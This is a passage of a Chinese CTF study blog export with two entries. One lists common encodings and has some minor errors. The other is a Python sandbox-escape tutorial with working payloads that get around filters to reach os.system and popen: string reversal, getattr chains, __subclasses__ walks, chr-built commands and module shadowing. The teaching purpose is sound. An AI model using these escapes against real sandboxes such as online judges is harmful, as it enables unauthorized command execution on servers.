    <entry>
      <title>MISC</title>
      <link href="/2023/07/29/MISC/"/>
      <url>/2023/07/29/MISC/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="编码基础"><a href="#编码基础" class="headerlink" title="编码基础"></a>编码基础</h1><h2 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h2><h3 id="ASCII编码"><a href="#ASCII编码" class="headerlink" title="ASCII编码"></a>ASCII编码</h3><blockquote><p>ASCII (American Standard Code for Information Interchange)：美国信息交换标准代码是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他<a href="https://baike.baidu.com/item/西欧/3028649?fromModule=lemma_inlink">西欧</a>语言。</p></blockquote><p><strong>ASCII码对照表</strong></p><p><img src="https://www.runoob.com/wp-content/uploads/2022/03/ascii-1-1.png" alt=""></p><p><a href="https://coding.tools/cn/ascii-to-hex">在线转换工具</a></p><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><blockquote><p>URL编码又叫百分号编码，是统一资源定位（URL）编码方式。URL地址（常说网址）规定了常用的数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（<code>/ , : @</code>等），剩下的其他所有字符必须通过<code>%xx</code>编码处理，现在已经成为一种规范了，基本所有程序语言都有这种编码</p></blockquote><p><img src="/img/MISC/url.png" alt=""></p><p><a href="https://c.runoob.com/front-end/695/?">在线工具</a></p><h3 id="base家族编码"><a href="#base家族编码" class="headerlink" title="base家族编码"></a>base家族编码</h3><blockquote><p>base16 / base32 / base58 / base62 / base64 / base91 / base92 / base100</p></blockquote><p>base64的编码表是由（<strong>A-Z、a-z、0-9、+、/</strong>）64个可见字符构成，<code>=</code>符号用作后缀填充</p><p><strong>tips：</strong>一般情况下密文尾部都会有两个等号</p><ul><li>base64编码</li></ul><p>特征特点：密文由64个字符<code>(A-Z,a-z,0-9,+,/)</code>组成，区分字母大小写，末尾可能会出现1或2个<code>=</code> 最多有2个，明文越长数字越长</p><p>索引表：</p><p><img src="/img/MISC/base64.webp" alt=""></p><p>举个例子：</p><blockquote><p>文本：T h e</p><p>对应ascii编码：84 104 101</p><p>8位binary：01010100 01101000 01100101</p><p>6位binary：010101 000110 100001 100101</p><p>高位补0：00010101 00000110 00100001 00100101</p><p>对用十进制：21 6 33 37</p><p>查表：v G h l</p></blockquote><ul><li>base62编码</li></ul><p>特征特点：密文由32个字符<code>(A-Z,2-7)</code>组成，末尾可能会有<code>=</code>，但最多有6个</p><ul><li>base16编码</li></ul><p>特征特点：密文由16个字符<code>(0-9,A-F)</code>组成</p><ul><li>base36编码</li></ul><p>特征特点：密文由36个字符<code>(0-9,a-z)</code>组成，加密仅支持整数数字，解密仅支持字符串，不支持中文</p><ul><li>base58编码</li></ul><p>特征特点：Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址，Base58不使用数字<code>0</code>，字母大写<code>O</code>，字母大写<code>I</code>，和字母小写<code>l</code>，以及<code>+</code>和<code>/</code>符号</p><ul><li>base62编码</li></ul><p>特征特点：密文由62字符<code>(0-9，a-z，A-Z)</code>组成</p><ul><li>base91编码</li></ul><p>特征特点：密文由91个字符<code>(0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`&#123;|&#125;”)</code>组成</p><ul><li>base92编码</li></ul><p>特征特点：密文由92个字符<code>(0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`&#123;|&#125;”~0</code>组成</p><p><strong>比base91多了一个<code>~</code></strong></p><ul><li>base100编码</li></ul><p>特征特点：密文由一堆表情组成</p><p><a href="https://ctf.bugku.com/tools.html">在线工具</a></p><h3 id="莫尔斯编码（Morse-Code）"><a href="#莫尔斯编码（Morse-Code）" class="headerlink" title="莫尔斯编码（Morse Code）"></a>莫尔斯编码（Morse Code）</h3><blockquote><p>摩尔斯电码（Morse code）也被称作摩斯密码，是一种时通时断的信号代码，通过不同的排列顺序来表达不同的英文字母、数字和标点符号。</p></blockquote><p><img src="/img/MISC/mosi.jpg" alt=""></p><p><a href="http://msmm.qianwanku.com/">在线工具</a></p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><blockquote><p>shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因为经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。</p></blockquote><p><img src="/img/MISC/shellcode.png" alt=""></p><h3 id="XXencode编码"><a href="#XXencode编码" class="headerlink" title="XXencode编码"></a>XXencode编码</h3><blockquote><p>XXEncode是一种二进制到文字的编码！它跟UUEncode以及Base64编码方法很类似。它也是定义了用可打印字符表示二进制文字一种方法，不是一种新的编码集合。XXEncode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。它64可打印字符固定字符范围及顺序！包括大小写字母、数字以及+-字符。它较UUEncode编码优点在于它64字符是常见字符，没有任何特殊字符！</p></blockquote><p><a href="http://www.atoolbox.net/Tool.php?Id=780">在线工具</a></p><h3 id="UUencode编码"><a href="#UUencode编码" class="headerlink" title="UUencode编码"></a>UUencode编码</h3><blockquote><p>UUENCODE是将<a href="https://baike.baidu.com/item/二进制文件/996661?fromModule=lemma_inlink">二进制文件</a>转换为文本<a href="https://baike.baidu.com/item/文件?fromModule=lemma_inlink">文件</a>的过程，转换后的文件可以通过纯文本e-mail进行传输，在接收方对该文件进行uudecode，即将其转换为初始的二进制文件。</p></blockquote><p><a href="https://www.qqxiuzi.cn/bianma/uuencode.php">在线工具</a></p><h3 id="aaencode编码"><a href="#aaencode编码" class="headerlink" title="aaencode编码"></a>aaencode编码</h3><blockquote><p>将js代码转换成常用的网络表情，也就是我们常说的颜文字js加密</p></blockquote><p><a href="http://www.hiencode.com/aaencode.html">在线工具</a></p><h3 id="JSfuck"><a href="#JSfuck" class="headerlink" title="JSfuck"></a>JSfuck</h3><blockquote><p>JSfuck只是用6种字符<code>[]!()+</code></p></blockquote><p><a href="https://www.bugku.com/tools/jsfuck/">在线工具)</a></p><h3 id="jother"><a href="#jother" class="headerlink" title="jother"></a>jother</h3><blockquote><p>jother只是用八种字符<code>[]!()+&#123;&#125;</code></p><p>可以打开谷歌浏览器 按F12<br>然后console将那堆解码的东西复制过去 按回车即可解码</p></blockquote><h3 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h3><blockquote><p>Brainfuck使用八种字符，<code>&gt;&lt;+-.,[]</code>的组合来完成</p></blockquote><p><a href="https://ctf.bugku.com/tool/brainfuck">在线工具</a></p><h3 id="Ook"><a href="#Ook" class="headerlink" title="Ook"></a>Ook</h3><blockquote><p>ook密码中有大量ook，加上一些符号</p></blockquote><p><a href="https://www.splitbrain.org/services/ook">在线工具</a></p><h3 id="敲击码"><a href="#敲击码" class="headerlink" title="敲击码"></a>敲击码</h3><blockquote><p>敲击码(Tap code)是一种以非常简单的方式对文本信息进行编码的方法。因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是是用K字母被整合到C中。</p></blockquote><p>敲击码表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">![shehui](/img/MISC/shehui.png)#!shell</span><br><span class="line">  1  2  3  4  5</span><br><span class="line">1 A  B C/K D  E</span><br><span class="line">2 F  G  H  I  J </span><br><span class="line">3 L  M  N  O  P</span><br><span class="line">4 Q  R  S  T  U</span><br><span class="line">5 V  W  X  Y  Z</span><br></pre></td></tr></table></figure><p><img src="/img/MISC/qiaoji.png" alt=""></p><h2 id="稀奇古怪的编码"><a href="#稀奇古怪的编码" class="headerlink" title="稀奇古怪的编码"></a>稀奇古怪的编码</h2><h3 id="社会主义核心价值观"><a href="#社会主义核心价值观" class="headerlink" title="社会主义核心价值观"></a>社会主义核心价值观</h3><p>特点：字符全部都是社会主义核心价值观</p><p><img src="/img/MISC/shehui.png" alt=""></p><p><a href="http://z.duoluosb.com/">在线工具</a></p><h3 id="与佛论禅"><a href="#与佛论禅" class="headerlink" title="与佛论禅"></a>与佛论禅</h3><p>特点：一些稀奇古怪不认识的字</p><p><img src="/img/MISC/fo.png" alt=""></p><p><a href="http://www.atoolbox.net/Tool.php?Id=1027">在线工具</a></p><h3 id="与熊论道"><a href="#与熊论道" class="headerlink" title="与熊论道"></a>与熊论道</h3><p><img src="/img/MISC/xiong.png" alt=""></p><p><a href="http://hi.pcmoe.net/">在线工具</a></p><h3 id="兽音译者"><a href="#兽音译者" class="headerlink" title="兽音译者"></a>兽音译者</h3><p><img src="/img/MISC/shou.png" alt=""></p><p><a href="http://hi.pcmoe.net/roar.html">在线工具</a></p><h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="文件类型识别"><a href="#文件类型识别" class="headerlink" title="文件类型识别"></a>文件类型识别</h2><ul><li><code>file</code>命令</li></ul><p>file 命令实际上是一个命令行工具，用来查看文件类型。</p><p>使用方法： 将文件复制到 kail 或者带有 file 工具的系统中，使用 file 查看文件。</p><p>将文件后缀名补上即可正常打开。</p><h2 id="文件分离"><a href="#文件分离" class="headerlink" title="文件分离"></a>文件分离</h2><h2 id="文件合并"><a href="#文件合并" class="headerlink" title="文件合并"></a>文件合并</h2>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python沙箱逃逸</title>
      <link href="/2023/07/28/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2023/07/28/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>Python 的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。</p><p>让用户提交 Python 代码并在服务器上执行，是一些 <a href="https://so.csdn.net/so/search?q=OJ&amp;spm=1001.2101.3001.7020">OJ</a>、量化网站重要的服务，很多 CTF 也有类似的题。为了不让恶意用户执行任意的 Python 代码，就需要确保 Python 运行在沙箱中。沙箱经常会禁用一些敏感的函数，例如os等</p></blockquote><h1 id="执行系统命令"><a href="#执行系统命令" class="headerlink" title="执行系统命令"></a>执行系统命令</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>在 Python 中执行系统命令的方式有：</p><ul><li><code>os</code></li><li><code>commands：</code>版本限制：<code>2.x</code></li><li><code>subprocess</code></li><li><code>timeit：</code> <code>timeit.sys、timeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;, number=1)</code></li><li><code>platform：</code> <code>platform.os、platform.sys、platform.popen(&#39;whoami&#39;, mode=&#39;r&#39;, bufsize=-1).read()</code></li></ul><ul><li><code>pty：</code> <code>pty.spawn(&#39;ls&#39;)</code>、<code>pty.os</code></li><li><code>bdb：</code> <code>bdb.os</code>、<code>cgi.sys</code></li><li><code>cgi：</code> <code>cgi.os</code>、<code>cgi.sys</code></li><li>…</li></ul><h2 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h2><blockquote><p>Python导入模块时，会先判断<code>sys.modules</code>是否已经加载了该模块，如果没有加载则从<code>sys.path</code>中的目录按照模块名查找<code>py</code>、<code>pyc</code>、<code>pyd</code>文件，找到后执行该文件载入内存并添加至<code>sys.modules</code>中，再将模块名称导入Local命名空间。如果<code>a.py</code>中存在<code>import b</code>，则在<code>import a</code>时<code>ab</code>两个模块都会添加至<code>sys.modules</code>中，但仅将<code>a</code>导入Local命名空间。通过<code>from x import y</code>时，则将<code>x</code>添加至<code>sys.modules</code>中，将<code>y</code>导入Local命名空间。</p></blockquote> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xxx</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> xxx <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">__import__</span>(<span class="string">&quot;pbzznaqf&quot;</span>.decode(<span class="string">&#x27;rot_13&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(f.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtin__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>]=<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3.8/xxx.py&#x27;</span>).read()</span><br><span class="line"><span class="built_in">exec</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2</span></span><br><span class="line">execfile(<span class="string">&#x27;/usr/lib/python2.7/xxx.py&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/usr/lib/python3/os.py&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="花式处理字符串"><a href="#花式处理字符串" class="headerlink" title="花式处理字符串"></a>花式处理字符串</h2><p>代码要是出现<code>os</code>，直接不让运行，那么可以利用字符串的各种变化来引入<code>os</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;o&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;s&#x27;</span></span><br><span class="line"><span class="built_in">__import__</span>(a+b).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">laptop-li6skpub\glowworm</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">exec</span>(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line">laptop-li6skpub\glowworm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对字符串的处理可以有：逆序、拼接、base64、hex、rot13…等等</span></span><br><span class="line">[<span class="string">&#x27;__builtins__&#x27;</span>] == </span><br><span class="line">[<span class="string">&#x27;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#x27;</span>] == <span class="comment">#hex</span></span><br><span class="line">[<span class="string">u&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;</span>] == <span class="comment">#Unicode</span></span><br><span class="line">[<span class="string">&#x27;X19idWlsdGluc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)] == <span class="comment">#base64</span></span><br><span class="line">[<span class="string">&#x27;__buil&#x27;</span>+<span class="string">&#x27;tins__&#x27;</span>] == <span class="comment">#+拼接</span></span><br><span class="line">[<span class="string">&#x27;__buil&#x27;</span><span class="string">&#x27;tins__&#x27;</span>] == </span><br><span class="line">[<span class="string">&quot;_builtins_&quot;</span>.join(<span class="string">&quot;__&quot;</span>)] == </span><br><span class="line">[<span class="string">&#x27;%c%c%c%c%c%c%c%c%c%c%c%c&#x27;</span> % (<span class="number">95</span>, <span class="number">95</span>, <span class="number">98</span>, <span class="number">117</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">115</span>, <span class="number">95</span>, <span class="number">95</span>)]<span class="comment">#chr</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>如果过滤了数字：</p><blockquote><p>\1. 0：<code>int(bool([]))</code>、<code>Flase</code>、<code>len([])</code><br>\2. 1：<code>int(bool([&quot;&quot;]))</code>、<code>True</code><br>\3. 获取稍微大的数字：<code>len(str(&#123;&#125;.keys))</code>，不过需要慢慢找长度符合的字符串<br>\4. 1.0：<code>float(True)</code></p></blockquote><p>其实有了 <code>0</code> 就可以了，要啥整数直接做运算即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> ** <span class="number">0</span> == <span class="number">1</span></span><br><span class="line"><span class="number">1</span> + <span class="number">1</span> == <span class="number">2</span></span><br><span class="line"><span class="number">2</span> + <span class="number">1</span> == <span class="number">3</span></span><br><span class="line"><span class="number">2</span> ** <span class="number">2</span> == <span class="number">4</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="花式执行函数"><a href="#花式执行函数" class="headerlink" title="花式执行函数"></a>花式执行函数</h2><p>os 中能够执行系统命令的函数有很多：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(os.system(<span class="string">&#x27;whoami&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()) </span><br><span class="line"><span class="built_in">print</span>(os.popen2(<span class="string">&#x27;whoami&#x27;</span>).read()) <span class="comment"># 2.x</span></span><br><span class="line"><span class="built_in">print</span>(os.popen3(<span class="string">&#x27;whoami&#x27;</span>).read()) <span class="comment"># 2.x</span></span><br><span class="line"><span class="built_in">print</span>(os.popen4(<span class="string">&#x27;whoami&#x27;</span>).read()) <span class="comment"># 2.x</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>可以通过 <code>getattr</code> 拿到对象的方法、属性：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">getattr</span>(os, <span class="string">&#x27;metsys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure><p>不让出现 import也没事：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">getattr</span>(<span class="built_in">getattr</span>(__builtins__, <span class="string">&#x27;__tropmi__&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;so&#x27;</span>[::-<span class="number">1</span>]), <span class="string">&#x27;metsys&#x27;</span>[::-<span class="number">1</span>])(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">laptop-li6skpub\glowworm</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="通过继承关系逃逸"><a href="#通过继承关系逃逸" class="headerlink" title="通过继承关系逃逸"></a>通过继承关系逃逸</h2><p><code>.__mro__</code> 或 <code>.mro()</code>，是个元组，记录了继承关系：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure><p>类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>&#39;&#39;</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>test.__bases__</span><br><span class="line">()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">test</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>test.__bases__</span><br><span class="line">(&lt;<span class="built_in">type</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br></pre></td></tr></table></figure><p>由于没法直接引入 os，那么假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os。例如，<code>site</code> 这个库就有 <code>os</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> site</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>site.os</span><br><span class="line">&lt;module <span class="string">&#x27;os&#x27;</span> (frozen)&gt;</span><br></pre></td></tr></table></figure><p>能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 <code>import site</code>。可以利用 <code>reload</code>，变相加载 <code>os</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> site</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;os&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os = reload(site.os)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">laptop-li6skpub\glowworm</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h1><p>2.x 有个内建的<code>file：</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>file(<span class="string">&#x27;key&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;laptop-li6skpub\glowworm\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file(<span class="string">&#x27;key&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;laptop-li6skpub\glowworm&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>file(<span class="string">&#x27;key&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;laptop-li6skpub\glowworm&#x27;</span></span><br></pre></td></tr></table></figure><p>还有个 <code>open</code>，2.x 与 3.x 通用。</p><p>如果能写，可以将类似的文件保存为<code>math.py</code>，然后 import 进来：</p><p>math.py：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.system(<span class="string">&#x27;whoami&#x27;</span>))</span><br></pre></td></tr></table></figure><p>调用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> math</span><br><span class="line">laptop-li6skpub\glowworm</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><p>这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在<code>sys.modules</code>中有的，这些库无法这样利用，会直接从<code>sys.modules</code>中加入，比如<code>re</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;re&#x27;</span> <span class="keyword">in</span> sys.modules</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;math&#x27;</span> <span class="keyword">in</span> sys.modules</span><br><span class="line"><span class="literal">False</span></span><br></pre></td></tr></table></figure><p>当然在<code>import re</code> 之前<code>del sys.modules[&#39;re&#39;]</code>也不是不可以…</p><h1 id="常见过滤"><a href="#常见过滤" class="headerlink" title="常见过滤"></a>常见过滤</h1><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h2><p>应对的方式就是将<code>[]</code>的功能用<code>pop</code>、<code>__getitem__</code> 代替（实际上<code>a[0]</code>就是在内部调用了<code>a.__getitem__(0)</code>）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.func_globals.get(<span class="string">&#x27;linecache&#x27;</span>).os.popen(<span class="string">&#x27;whoami&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;laptop-li6skpub\glowworm\n&#x27;</span></span><br></pre></td></tr></table></figure><p>当然，dict 也是可以 pop 的：<code>&#123;&quot;a&quot;: 1&#125;.pop(&quot;a&quot;)</code></p><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><ul><li>最简单就是用 <code>chr</code> </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.system(</span><br><span class="line">    <span class="built_in">chr</span>(<span class="number">119</span>)+<span class="built_in">chr</span>(<span class="number">104</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">109</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>利用 <code>str</code> 和 <code>[]</code>，挨个把字符拼接出来</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">os.system(</span><br><span class="line">    <span class="built_in">str</span>(().__class__.__new__)[<span class="number">21</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">13</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">14</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">40</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">10</span>]+<span class="built_in">str</span>(().__class__.__new__)[<span class="number">3</span>]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>格式化字符串</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 